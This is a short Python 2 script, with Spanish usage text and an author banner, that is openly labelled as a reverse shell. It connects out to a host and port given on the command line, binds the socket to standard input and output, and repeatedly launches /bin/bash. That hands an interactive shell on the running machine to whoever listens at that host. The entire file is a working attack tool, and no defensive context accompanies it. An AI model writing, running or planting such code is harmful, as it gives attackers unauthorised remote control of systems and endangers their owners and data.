#!/usr/bin/env python

import sys, socket, os

def proceso():
	host = str(sys.argv[1])
	puerto = int(sys.argv[2])
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	while 1:
		try:
			s.connect((host, puerto))
			os.dup2(s.fileno(), sys.stdin.fileno())
			os.dup2(s.fileno(), sys.stdout.fileno())
		
			s.sendall(('\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n'))
			s.sendall(('~~         Python Reverse shell     ~~\n'))
			s.sendall(('~~  Kalith: Kalith[at]gmail[dot]com ~~\n'))
			s.sendall(('~~            http//0x59.es         ~~\n'))
			s.sendall(('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n'))

			while 1:
				os.system('/bin/bash')
		except:
			pass

def main():
	if len(sys.argv) == 3:
		proceso()
	else:
		print "Modo de uso: "
		print "python %s host puerto" % (sys.argv[0])
		
main()
